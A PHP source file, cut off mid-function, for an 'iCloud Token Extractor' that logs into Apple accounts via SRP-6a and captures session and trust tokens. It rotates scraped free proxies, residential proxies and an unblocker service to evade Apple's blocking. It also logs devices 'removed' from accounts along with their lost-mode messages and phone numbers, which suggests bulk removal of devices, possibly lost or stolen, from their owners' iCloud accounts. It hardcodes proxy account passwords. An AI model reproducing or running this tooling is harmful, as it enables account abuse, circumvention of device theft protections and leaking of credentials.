<?php
/**
 * iCloud Token Extractor — PHP Port
 * Migración completa del worker_gui.py
 * Requiere: PHP 7.4+, extensión gmp, extensión curl
 * 
 * Uso: php 
 */

// 1. Permite el acceso desde cualquier lugar (el asterisco hace la magia)
header("Access-Control-Allow-Origin: *");

// 2. Permite los métodos HTTP que vayas a necesitar
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");

// 3. Permite los encabezados comunes que suelen enviar los navegadores o librerías como Axios/Fetch
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

// ============================================================================
// GMP POLYFILL (fallback via BCMath if php-gmp extension is not installed)
// ============================================================================
if (!function_exists('gmp_init')) {
    if (!extension_loaded('bcmath')) {
        die("Error: Se requiere la extensión 'gmp' o 'bcmath' en PHP.\n");
    }

    function bchex2dec(string $hex): string {
        $hex = ltrim(strtolower($hex), '0');
        if ($hex === '') return '0';
        $dec = '0';
        $len = strlen($hex);
        for ($i = 0; $i < $len; $i += 4) {
            $chunk = substr($hex, $i, 4);
            $multiplier = (string)(1 << (strlen($chunk) * 4));
            $dec = bcmul($dec, $multiplier);
            $dec = bcadd($dec, (string)hexdec($chunk));
        }
        return $dec;
    }

    function bcdec2hex(string $dec): string {
        if ($dec === '0' || $dec === '') return '0';
        $hex = '';
        while (bccomp($dec, '0') > 0) {
            $mod = bcmod($dec, '16');
            $hex = dechex((int)$mod) . $hex;
            $dec = bcdiv($dec, '16', 0);
        }
        return $hex;
    }

    function gmp_init($val, int $base = 10) {
        $str = (string)$val;
        if ($base === 16) {
            return bchex2dec($str);
        }
        return $str;
    }

    function gmp_import(string $data) {
        $hex = bin2hex($data);
        if ($hex === '') return '0';
        return bchex2dec($hex);
    }

    function gmp_powm($base, $exp, $mod) {
        return bcpowmod((string)$base, (string)$exp, (string)$mod, 0);
    }

    function gmp_cmp($a, $b): int {
        return bccomp((string)$a, (string)$b, 0);
    }

    function gmp_mod($a, $b) {
        $r = bcmod((string)$a, (string)$b, 0);
        if (bccomp($r, '0') < 0) {
            $r = bcadd($r, (string)$b, 0);
        }
        return $r;
    }

    function gmp_mul($a, $b) {
        return bcmul((string)$a, (string)$b, 0);
    }

    function gmp_sub($a, $b) {
        return bcsub((string)$a, (string)$b, 0);
    }

    function gmp_add($a, $b) {
        return bcadd((string)$a, (string)$b, 0);
    }

    function gmp_strval($num, int $base = 10): string {
        if ($base === 16) {
            return bcdec2hex((string)$num);
        }
        return (string)$num;
    }
}

// ============================================================================
// CONFIG
// ============================================================================
define('AUTH_ENDPOINT', 'https://idmsa.apple.com/appleauth/auth');
define('ICLOUD_SETUP_URL', 'https://setup.icloud.com/setup/ws/1/accountLogin');

$DEFAULT_CONFIG = [
    // ─── METODO DE CONEXION ───────────────────────────────────────────
    // Opciones disponibles:
    //   'direct'      → Sin proxy, conexion directa (fallback: free_proxy)
    //   'proxy'       → Usa proxy residencial (residential)
    //   'unblocker'   → Usa Site Unblocker (decodo)
    //   'smart'       → Intenta direct → proxy → unblocker automaticamente
    //   'free_proxy'  → Solo free proxies scrapeados
    //   'gitproxy'    → Proxies de listas GitHub (proxifly + multi-protocolo)
    // ─────────────────────────────────────────────────────────────────
    'mode' => 'direct',

    // ─── OPCIONES GENERALES ──────────────────────────────────────────
    'autoremove_enabled' => true,
    'max_retries' => 2,
    'human_delay' => true,

    // ─── PROXY RESIDENCIAL (modo 'proxy' o 'smart') ─────────────────
    'proxy_host' => 'gate.decodo.com',
    'proxy_user' => 'spbbx7qccs',
    'proxy_pass' => 'wqFdEaG_vfr2mL189r',
    'proxy_port_start' => 10001,
    'proxy_port_end' => 10010,

    // ─── SITE UNBLOCKER (modo 'unblocker' o 'smart') ────────────────
    'unblocker_host' => 'unblock.decodo.com',
    'unblocker_user' => 'U0000360915',
    'unblocker_pass' => 'PW_111be7b032503897a1855db112c61a7b8',
    'unblocker_port' => '60000',
];

$TOKEN_HEADERS = [
    'X-Apple-ID-Account-Country' => 'account_country',
    'X-Apple-ID-Session-Id' => 'session_id',
    'X-Apple-Session-Token' => 'session_token',
    'X-Apple-TwoSV-Trust-Token' => 'trust_token',
    'scnt' => 'scnt',
];

$STATS = ['total' => 0, 'successful' => 0, 'failed' => 0, 'errors_503' => 0, 'errors_401' => 0, 'errors_403' => 0, 'two_fa' => 0, 'cycle' => 0, 'autoremove_sent' => 0, 'autoremove_success' => 0, 'devices_removed' => 0];
$last_success_mode = null;

// ============================================================================
// FREE PROXY SCRAPER (fallback when direct/paid proxies fail)
// ============================================================================
define('FREE_PROXY_SOURCES', [
    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
]);
define('FREE_PROXY_TEST_URL', 'http://httpbin.org/ip');
define('FREE_PROXY_TIMEOUT', 4);
define('FREE_PROXY_MICRO_BATCH', 15);
define('FREE_PROXY_MAX_GOOD', 3);
define('FREE_PROXY_CACHE_FILE', sys_get_temp_dir() . '/apple_free_proxies.json');
define('FREE_PROXY_CACHE_TTL', 300);
define('FREE_PROXY_MAX_SOURCES_FETCH', 2);

$_free_proxy_pool = [];
$_free_proxy_idx = 0;

function free_proxy_fetch_source(string $url): array
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 12,
        CURLOPT_CONNECTTIMEOUT => 8,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT      => 'Mozilla/5.0',
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200 || empty($response)) return [];

    $proxies = [];
    foreach (array_filter(array_map('trim', explode("\n", $response))) as $line) {
        if (preg_match('/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})/', $line, $m)) {
            $proxies[] = $m[1];
        }
    }
    return $proxies;
}

function free_proxy_test_batch(array $batch): array
{
    $mh = curl_multi_init();
    curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, FREE_PROXY_MICRO_BATCH);

    $handles = [];
    $starts  = [];

    foreach ($batch as $proxy) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => FREE_PROXY_TEST_URL,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_PROXY          => $proxy,
            CURLOPT_PROXYTYPE      => CURLPROXY_HTTP,
            CURLOPT_TIMEOUT        => FREE_PROXY_TIMEOUT,
            CURLOPT_CONNECTTIMEOUT => FREE_PROXY_TIMEOUT,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HEADER         => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
            CURLOPT_NOSIGNAL       => 1,
        ]);
        curl_multi_add_handle($mh, $ch);
        $handles[(int)$ch] = ['handle' => $ch, 'proxy' => $proxy];
        $starts[(int)$ch]  = microtime(true);
    }

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        if ($running > 0) curl_multi_select($mh, 0.05);
    } while ($running > 0);

    $results = [];
    foreach ($handles as $id => $item) {
        $ch       = $item['handle'];
        $response = curl_multi_getcontent($ch);
        $error    = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $latency  = round((microtime(true) - $starts[$id]) * 1000);

        if ($httpCode === 200 && !empty($response) && empty($error)) {
            $json = json_decode($response, true);
            if (isset($json['origin'])) {
                $results[] = [
                    'proxy'      => $item['proxy'],
                    'latency_ms' => $latency,
                ];
            }
        }

        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);
    usort($results, fn($a, $b) => $a['latency_ms'] <=> $b['latency_ms']);
    return $results;
}

function free_proxy_get_pool(): array
{
    if (file_exists(FREE_PROXY_CACHE_FILE)) {
        $cache = json_decode(file_get_contents(FREE_PROXY_CACHE_FILE), true);
        if ($cache && ($cache['ts'] ?? 0) > time() - FREE_PROXY_CACHE_TTL && !empty($cache['proxies'])) {
            apple_ulog('debug', 'FREE_PROXY', 'Using cached pool: ' . count($cache['proxies']) . ' proxies');
            return $cache['proxies'];
        }
    }

    apple_ulog('info', 'FREE_PROXY', 'Fast-scraping free proxies (micro-batch mode)...');

    $sources = FREE_PROXY_SOURCES;
    shuffle($sources);
    $sources = array_slice($sources, 0, FREE_PROXY_MAX_SOURCES_FETCH);

    $all = [];
    foreach ($sources as $source) {
        $fetched = free_proxy_fetch_source($source);
        if (!empty($fetched)) {
            $all = array_merge($all, $fetched);
            apple_ulog('debug', 'FREE_PROXY', '  Fetched ' . count($fetched) . ' from source');
            if (count($all) >= 100) break;
        }
    }

    $all = array_values(array_unique($all));
    shuffle($all);

    if (empty($all)) {
        apple_ulog('warning', 'FREE_PROXY', 'No proxies scraped from any source');
        return [];
    }

    apple_ulog('info', 'FREE_PROXY', count($all) . ' unique proxies — testing in micro-batches of ' . FREE_PROXY_MICRO_BATCH . '...');

    $good = [];
    foreach (array_chunk($all, FREE_PROXY_MICRO_BATCH) as $batch_num => $batch) {
        $passed = free_proxy_test_batch($batch);
        if (!empty($passed)) {
            $good = array_merge($good, $passed);
            apple_ulog('success', 'FREE_PROXY', 'Batch #' . ($batch_num + 1) . ': found ' . count($passed) . ' working proxy(ies) — stopping early');
            break;
        }
        apple_ulog('debug', 'FREE_PROXY', 'Batch #' . ($batch_num + 1) . ': 0/' . count($batch) . ' passed');
        if ($batch_num >= 5) {
            apple_ulog('warning', 'FREE_PROXY', 'Giving up after 6 micro-batches');
            break;
        }
    }

    $good = array_slice($good, 0, FREE_PROXY_MAX_GOOD);

    if (!empty($good)) {
        $proxies = array_column($good, 'proxy');
        $avg = round(array_sum(array_column($good, 'latency_ms')) / count($good));
        apple_ulog('success', 'FREE_PROXY', count($good) . ' working proxies found (avg ' . $avg . 'ms)');

        file_put_contents(FREE_PROXY_CACHE_FILE, json_encode([
            'ts' => time(),
            'proxies' => $proxies,
        ], JSON_UNESCAPED_SLASHES), LOCK_EX);

        return $proxies;
    }

    apple_ulog('warning', 'FREE_PROXY', 'No working free proxies found');
    return [];
}

function free_proxy_next(): ?string
{
    global $_free_proxy_pool, $_free_proxy_idx;

    if (empty($_free_proxy_pool)) {
        $_free_proxy_pool = free_proxy_get_pool();
        $_free_proxy_idx = 0;
    }

    if (empty($_free_proxy_pool)) return null;

    $proxy = $_free_proxy_pool[$_free_proxy_idx % count($_free_proxy_pool)];
    $_free_proxy_idx++;
    return 'http://' . $proxy;
}

// ============================================================================
// GITPROXY — Proxies from GitHub lists (proxifly/free-proxy-list + extras)
// ============================================================================
define('GITPROXY_SOURCES', [
    'http'   => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
    'socks4' => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt',
    'socks5' => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt',
    'all'    => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt',
    'us'     => 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/countries/US/data.txt',
]);

define('GITPROXY_TEST_URL', 'https://idmsa.apple.com');
define('GITPROXY_TEST_TIMEOUT', 6);
define('GITPROXY_MICRO_BATCH', 15);
define('GITPROXY_MAX_GOOD', 3);
define('GITPROXY_CACHE_FILE', sys_get_temp_dir() . '/apple_gitproxies.json');
define('GITPROXY_CACHE_TTL', 600);
define('GITPROXY_MAX_MICRO_ROUNDS', 8);

$_gitproxy_pool = [];
$_gitproxy_idx  = 0;

function gitproxy_fetch_source(string $url, string $protocol_hint): array
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; irealmServer-GitProxy/1.0)',
        CURLOPT_HTTPHEADER     => ['Accept: text/plain'],
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200 || empty($response)) {
        apple_ulog('warning', 'GITPROXY', "Failed to fetch {$protocol_hint} list from CDN (HTTP {$httpCode})");
        return [];
    }

    $proxies = [];
    $lines = array_filter(array_map('trim', explode("\n", $response)));

    foreach ($lines as $line) {
        if (preg_match('#^(https?|socks[45])://(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})$#i', $line, $m)) {
            $proxies[] = [
                'protocol' => strtolower($m[1]),
                'address'  => $m[2],
                'url'      => strtolower($line),
            ];
            continue;
        }
        if (preg_match('/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})$/', $line, $m)) {
            $proto = ($protocol_hint === 'all') ? 'http' : $protocol_hint;
            $proxies[] = [
                'protocol' => $proto,
                'address'  => $m[1],
                'url'      => "{$proto}://{$m[1]}",
            ];
        }
    }

    return $proxies;
}

function gitproxy_test_batch(array $batch): array
{
    $mh = curl_multi_init();
    curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, GITPROXY_MICRO_BATCH);

    $handles = [];
    $starts  = [];

    foreach ($batch as $idx => $proxy) {
        $ch = curl_init();

        $curlOpts = [
            CURLOPT_URL            => GITPROXY_TEST_URL,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_NOBODY         => true,
            CURLOPT_PROXY          => $proxy['url'],
            CURLOPT_TIMEOUT        => GITPROXY_TEST_TIMEOUT,
            CURLOPT_CONNECTTIMEOUT => GITPROXY_TEST_TIMEOUT,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HEADER         => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
            CURLOPT_NOSIGNAL       => 1,
        ];

        switch ($proxy['protocol']) {
            case 'socks4':
                $curlOpts[CURLOPT_PROXYTYPE] = CURLPROXY_SOCKS4;
                break;
            case 'socks5':
                $curlOpts[CURLOPT_PROXYTYPE] = CURLPROXY_SOCKS5;
                break;
            default:
                $curlOpts[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
                if ($proxy['protocol'] === 'https') {
                    $curlOpts[CURLOPT_PROXY_SSL_VERIFYPEER] = false;
                }
                break;
        }

        curl_setopt_array($ch, $curlOpts);
        curl_multi_add_handle($mh, $ch);
        $handles[(int)$ch] = ['handle' => $ch, 'proxy' => $proxy];
        $starts[(int)$ch]  = microtime(true);
    }

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        if ($running > 0) curl_multi_select($mh, 0.05);
    } while ($running > 0);

    $results = [];
    foreach ($handles as $id => $item) {
        $ch       = $item['handle'];
        $error    = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $latency  = round((microtime(true) - $starts[$id]) * 1000);

        if ($httpCode > 0 && empty($error)) {
            $results[] = [
                'proxy'      => $item['proxy'],
                'latency_ms' => $latency,
                'http_code'  => $httpCode,
            ];
        }

        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);
    usort($results, fn($a, $b) => $a['latency_ms'] <=> $b['latency_ms']);
    return $results;
}

function gitproxy_get_pool(): array
{
    if (file_exists(GITPROXY_CACHE_FILE)) {
        $cache = json_decode(file_get_contents(GITPROXY_CACHE_FILE), true);
        if ($cache && ($cache['ts'] ?? 0) > time() - GITPROXY_CACHE_TTL && !empty($cache['proxies'])) {
            apple_ulog('debug', 'GITPROXY', 'Using cached pool: ' . count($cache['proxies']) . ' proxies');
            return $cache['proxies'];
        }
    }

    apple_ulog('info', 'GITPROXY', 'Fast-fetch proxy lists from GitHub CDN (micro-batch mode)...');

    $all_proxies = [];
    $seen_addresses = [];

    // Solo fetch 2 fuentes prioritarias para no demorar
    $priority_order = ['http', 'socks5'];

    foreach ($priority_order as $proto_key) {
        if (!isset(GITPROXY_SOURCES[$proto_key])) continue;

        $url = GITPROXY_SOURCES[$proto_key];
        $found = gitproxy_fetch_source($url, $proto_key);
        $new_count = 0;

        foreach ($found as $p) {
            if (!isset($seen_addresses[$p['address']])) {
                $seen_addresses[$p['address']] = true;
                $all_proxies[] = $p;
                $new_count++;
            }
        }

        apple_ulog('debug', 'GITPROXY', "  [{$proto_key}] fetched " . count($found) . " → {$new_count} new unique");

        // Si ya tenemos suficientes candidatos, no buscar más fuentes
        if (count($all_proxies) >= 200) break;
    }

    if (empty($all_proxies)) {
        // Fallback: intentar con 'all' y 'us'
        foreach (['all', 'us', 'socks4'] as $fallback_key) {
            if (!isset(GITPROXY_SOURCES[$fallback_key])) continue;
            $found = gitproxy_fetch_source(GITPROXY_SOURCES[$fallback_key], $fallback_key);
            foreach ($found as $p) {
                if (!isset($seen_addresses[$p['address']])) {
                    $seen_addresses[$p['address']] = true;
                    $all_proxies[] = $p;
                }
            }
            if (!empty($all_proxies)) break;
        }
    }

    if (empty($all_proxies)) {
        apple_ulog('warning', 'GITPROXY', 'No proxies fetched from any GitHub source');
        return [];
    }

    apple_ulog('info', 'GITPROXY', 'Total unique: ' . count($all_proxies) . ' — testing micro-batches of ' . GITPROXY_MICRO_BATCH . ' against Apple...');
    shuffle($all_proxies);

    $good = [];
    $chunks = array_chunk($all_proxies, GITPROXY_MICRO_BATCH);

    foreach ($chunks as $batch_num => $batch) {
        $passed = gitproxy_test_batch($batch);

        if (!empty($passed)) {
            $good = array_merge($good, $passed);
            $found_urls = implode(', ', array_map(fn($g) => $g['proxy']['url'], $passed));
            apple_ulog('success', 'GITPROXY', 'Batch #' . ($batch_num + 1) . ': found ' . count($passed) . ' working → stopping early');
            apple_ulog('debug', 'GITPROXY', "  Winners: {$found_urls}");
            break;
        }

        apple_ulog('debug', 'GITPROXY', 'Batch #' . ($batch_num + 1) . ': 0/' . count($batch) . ' passed');

        if ($batch_num + 1 >= GITPROXY_MAX_MICRO_ROUNDS) {
            apple_ulog('warning', 'GITPROXY', 'Giving up after ' . GITPROXY_MAX_MICRO_ROUNDS . ' micro-batches');
            break;
        }
    }

    $good = array_slice($good, 0, GITPROXY_MAX_GOOD);

    if (!empty($good)) {
        $urls = array_map(fn($g) => $g['proxy']['url'], $good);
        $avg = round(array_sum(array_column($good, 'latency_ms')) / count($good));

        $proto_counts = [];
        foreach ($good as $g) {
            $proto = $g['proxy']['protocol'];
            $proto_counts[$proto] = ($proto_counts[$proto] ?? 0) + 1;
        }
        $proto_str = implode(', ', array_map(fn($k, $v) => "{$k}:{$v}", array_keys($proto_counts), $proto_counts));

        apple_ulog('success', 'GITPROXY', count($good) . " working proxies (avg {$avg}ms) [{$proto_str}]");

        file_put_contents(GITPROXY_CACHE_FILE, json_encode([
            'ts'      => time(),
            'proxies' => $urls,
        ], JSON_UNESCAPED_SLASHES), LOCK_EX);

        return $urls;
    }

    apple_ulog('warning', 'GITPROXY', 'No working GitHub proxies found after testing');
    return [];
}

function gitproxy_next(): ?string
{
    global $_gitproxy_pool, $_gitproxy_idx;

    if (empty($_gitproxy_pool)) {
        $_gitproxy_pool = gitproxy_get_pool();
        $_gitproxy_idx = 0;
    }

    if (empty($_gitproxy_pool)) return null;

    $proxy = $_gitproxy_pool[$_gitproxy_idx % count($_gitproxy_pool)];
    $_gitproxy_idx++;
    return $proxy;
}

function gitproxy_flush_cache(): void
{
    global $_gitproxy_pool, $_gitproxy_idx;
    $_gitproxy_pool = [];
    $_gitproxy_idx = 0;
    @unlink(GITPROXY_CACHE_FILE);
    apple_ulog('info', 'GITPROXY', 'Cache flushed — next call will re-fetch from GitHub');
}

// ============================================================================
// UNIFIED LOGGING SYSTEM (Apple.php — separate from request.php)
// ============================================================================
require_once __DIR__ . '/../../_logger.php';
define('APPLE_UNIFIED_LOG', ilog_file('apple', 'apple_unified.log'));

$_apple_request_id = null;

function apple_ulog_start(string $apple_id, string $client_ip, string $mode): void
{
    global $_apple_request_id;
    $_apple_request_id = strtoupper(substr(uniqid(), -8));

    $separator = "\n" . str_repeat('═', 80) . "\n";
    $header  = "  REQUEST #{$_apple_request_id}  |  " . date('Y-m-d H:i:s') . "\n";
    $header .= "  Account: {$apple_id}  |  IP: {$client_ip}  |  Mode: " . strtoupper($mode) . "\n";
    $header .= str_repeat('─', 80) . "\n";

    file_put_contents(APPLE_UNIFIED_LOG, $separator . $header, FILE_APPEND | LOCK_EX);
}

function apple_ulog_end(bool $success, string $status, int $status_code, float $duration, ?string $connection_method = null): void
{
    global $_apple_request_id;

    $icon = $success ? '✅ SUCCESS' : '❌ FAILED';
    $footer  = str_repeat('─', 80) . "\n";
    $footer .= "  RESULT: {$icon}  |  Status: {$status}  |  HTTP: {$status_code}  |  Duration: {$duration}s";
    if ($connection_method) $footer .= "  |  Via: {$connection_method}";
    $footer .= "\n" . str_repeat('═', 80) . "\n";

    file_put_contents(APPLE_UNIFIED_LOG, $footer, FILE_APPEND | LOCK_EX);
    $_apple_request_id = null;
}

function apple_ulog(string $level, string $component, string $message): void
{
    global $_apple_request_id;

    $time = date('H:i:s.') . substr(microtime(true), -3);
    $lvl = str_pad(strtoupper($level), 7);
    $comp = str_pad($component, 12);
    $rid = $_apple_request_id ? "[{$_apple_request_id}]" : '[--------]';

    $line = "  {$time}  {$rid}  {$lvl}  {$comp}  {$message}\n";

    file_put_contents(APPLE_UNIFIED_LOG, $line, FILE_APPEND | LOCK_EX);
}

// ============================================================================
// SUCCESS LOGGER
// ============================================================================
define('SUCCESS_LOG_FILE', __DIR__ . '/devices_success.json');

class SuccessLogger {
    
    public static function logSuccessfulRemoval($appleId, $owner, $deviceInfo, $timestamp = null) {
        if ($timestamp === null) $timestamp = date('Y-m-d H:i:s');
        $log = self::load();
        $log[] = [
            'timestamp' => $timestamp,
            'unix_time' => time(),
            'apple_id' => $appleId,
            'account_owner' => $owner,
            'device' => [
                'name' => $deviceInfo['name'] ?? 'Unknown',
                'model' => $deviceInfo['model'] ?? 'Unknown',
                'device_class' => $deviceInfo['device_class'] ?? null,
                'product_type' => $deviceInfo['product_type'] ?? null,
                'device_model' => $deviceInfo['device_model'] ?? null,
                'model_display_name' => $deviceInfo['model_display_name'] ?? null,
                'device_color' => $deviceInfo['device_color'] ?? null,
                'is_mac' => $deviceInfo['is_mac'] ?? false,
                'battery_level_percent' => $deviceInfo['battery_level_percent'] ?? 0,
                'battery_status' => $deviceInfo['battery_status'] ?? 'Unknown',
                'lost_mode_enabled' => $deviceInfo['lost_mode_enabled'] ?? false,
                'lost_message' => $deviceInfo['lost_message'] ?? '',
                'lost_phone' => $deviceInfo['lost_phone'] ?? '',
                'image_url' => $deviceInfo['image_url'] ?? null
            ],
            'removal_status' => 'SUCCESS'
        ];
        self::save($log);
    }
    
    public static function logRemovalSession($appleId, $owner, $devicesRemoved, $totalDevices, $timestamp = null) {
        if ($timestamp === null) $timestamp = date('Y-m-d H:i:s');
        $log = self::load();
        $log[] = [
            'session_id' => uniqid('session_', true),
            'timestamp' => $timestamp,
            'unix_time' => time(),
            'apple_id' => $appleId,
            'account_owner' => $owner,
            'summary' => [
                'total_devices' => $totalDevices,
                'devices_removed' => count($devicesRemoved),
                'success_rate' => $totalDevices > 0 ? round((count($devicesRemoved) / $totalDevices) * 100, 2) : 0
            ],
            'devices_removed' => $devicesRemoved
        ];
        self::save($log);
    }
    
    public static function getStats() {
        $log = self::load();
        $totalRemovals = 0;
        $accounts = [];
        $deviceTypes = [];
        foreach ($log as $entry) {
            if (isset($entry['session_id'])) {
                $totalRemovals += $entry['summary']['devices_removed'] ?? 0;
                $accounts[$entry['apple_id']] = true;
            } elseif (isset($entry['device'])) {
                $totalRemovals++;
                $accounts[$entry['apple_id']] = true;
                $dc = $entry['device']['device_class'] ?? 'Unknown';
                $deviceTypes[$dc] = ($deviceTypes[$dc] ?? 0) + 1;
            }
        }
        return [
            'total_successful_removals' => $totalRemovals,
            'unique_accounts_processed' => count($accounts),
            'total_log_entries' => count($log),
            'device_types_distribution' => $deviceTypes
        ];
    }
    
    private static function load() {
        if (!file_exists(SUCCESS_LOG_FILE)) return [];
        $data = json_decode(file_get_contents(SUCCESS_LOG_FILE), true);
        return is_array($data) ? $data : [];
    }
    
    private static function save($data) {
        file_put_contents(SUCCESS_LOG_FILE, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
    }
}

// ============================================================================
// SRP-6a CONSTANTS (RFC 5054 — 2048-bit)
// ============================================================================
define('SRP_N_HEX', 'AC6BDB41324A9A9BF166DE5E1389582FAF72B6651987EE07FC3192943DB56050A37329CBB4A099ED8193E0757767A13DD52312AB4B03310DCD7F48A9DA04FD50E8083969EDB767B0CF6095179A163AB3661A05FBD5FAAAE82918A9962F0B93B855F97993EC975EEAA80D740ADBF4FF747359D041D5C33EA71D281E446B14773BCA97B43A23FB801676BD207A436C6481F1D2B9078717461A5B9D32E688F87748544523B524B0D57D5EA77A2775D2ECFA032CFBDBF52FB3786160279004E57AE6AF874E7303CE53299CCC041C7BC308D82A5698F3A8D0C38271AE35F8E9DBFBB694B5C803D89F7AE435DE236D525F54759B65E372FCD68EF20FA7111F9E4AFF73');
define('SRP_G', '2');

// ============================================================================
// LOGGING
// ============================================================================
function emit_log(string $type, string $message): void
{
    $time = date('H:i:s');
    $colors = ['error' => "\033[91m", 'success' => "\033[92m", 'info' => "\033[94m", 'system' => "\033[95m", 'warning' => "\033[93m", 'debug' => "\033[90m", 'removal' => "\033[96m"];
    $color = $colors[$type] ?? "\033[0m";
    $label = str_pad(strtoupper($type), 7);
    echo "{$time} | {$color}{$label}\033[0m | {$message}\n";

    apple_ulog($type, 'SRP_AUTH', $message);
}

// ============================================================================
// SRP PASSWORD (exact match of Python SrpPassword)
// ============================================================================
class SrpPassword
{
    private string $password;
    private string $hash;
    public ?string $salt = null;
    public ?int $iterations = null;
    public ?int $key_length = null;
    public ?string $protocol = null;

    public function __construct(string $password)
    {
        $this->password = $password;
        $this->hash = hash('sha256', $password, true); // raw binary
    }

    public function setEncryptInfo(string $salt, int $iterations, int $key_length, string $protocol): void
    {
        $this->salt = $salt;
        $this->iterations = $iterations;
        $this->key_length = $key_length;
        $this->protocol = $protocol;
    }

    public function encode(): string
    {
        if ($this->protocol === 's2k_fo') {
            $pwd = bin2hex($this->hash); // hex string as bytes
        }
        elseif ($this->protocol === 's2k') {
            $pwd = $this->hash; // raw binary
        }
        else {
            throw new \RuntimeException("Bad protocol: {$this->protocol}");
        }
        return hash_pbkdf2('sha256', $pwd, $this->salt, $this->iterations, $this->key_length, true);
    }
}

// ============================================================================
// SRP CLIENT (SRP-6a, RFC 5054, NG_2048, SHA256)
// Flags: rfc5054_enable + no_username_in_x (matching Python srp config)
// ============================================================================
class SrpClient
{
    private $N;
    private $g;
    private $a; // private random
    private $A; // public key
    private string $username;
    private SrpPassword $password;
    public ?string $H_AMK = null; // M2

    public function __construct(string $username, SrpPassword $password)
    {
        $this->N = gmp_init(SRP_N_HEX, 16);
        $this->g = gmp_init(SRP_G, 10);
        $this->username = $username;
        $this->password = $password;
    }

    /**
     * Start auth: generate random a, compute A = g^a mod N
     * Returns A as binary string
     */
    public function startAuthentication(): string
    {
        // Generate 256-bit random 'a'
        $rand_bytes = random_bytes(32);
        $this->a = gmp_import($rand_bytes);
        $this->A = gmp_powm($this->g, $this->a, $this->N);
        // Ensure A % N != 0
        if (gmp_cmp(gmp_mod($this->A, $this->N), gmp_init(0)) === 0) {
            return $this->startAuthentication(); // retry
        }
        return $this->gmpToBytes($this->A);
    }

    /**
     * Process server challenge: salt + B
     * Computes session key and returns M1 (proof)
     */
    public function processChallenge(string $salt, string $B_bytes): string
    {
        $B = gmp_import($B_bytes);
        // Verify B % N != 0
        if (gmp_cmp(gmp_mod($B, $this->N), gmp_init(0)) === 0) {
            throw new \RuntimeException('Server sent invalid B');
        }

        $N_bytes = $this->gmpToBytes($this->N);
        $width = strlen($N_bytes); // 256 for 2048-bit
        $A_bytes = $this->gmpToBytes($this->A);
        $B_norm = $this->gmpToBytes($B); // normalize B through GMP (strip leading zeros)

        // u = H(pad(A), pad(B)) — pysrp uses width=len(long_to_bytes(N))
        $u = gmp_import(hash('sha256', $this->padToWidth($A_bytes, $width) . $this->padToWidth($B_norm, $width), true));
        if (gmp_cmp($u, gmp_init(0)) === 0) {
            throw new \RuntimeException('u is zero');
        }

        // x = gen_x() from pysrp: H(salt, H(username + ':' + password.encode()))
        // With no_username_in_x: username = b'', so inner = H(b'' + b':' + password_key)
        $password_key = $this->password->encode();
        $inner_hash = hash('sha256', ':' . $password_key, true); // H(b':' + password_key)
        $x = gmp_import(hash('sha256', $salt . $inner_hash, true)); // H(salt | inner_hash)

        // k = H(N, g) — pysrp uses width=len(long_to_bytes(N)) for padding g
        $g_bytes = $this->gmpToBytes($this->g);
        $k = gmp_import(hash('sha256', $N_bytes . $this->padToWidth($g_bytes, $width), true));

        // S = (B - k * g^x mod N) ^ (a + u * x) mod N
        $gx = gmp_powm($this->g, $x, $this->N);
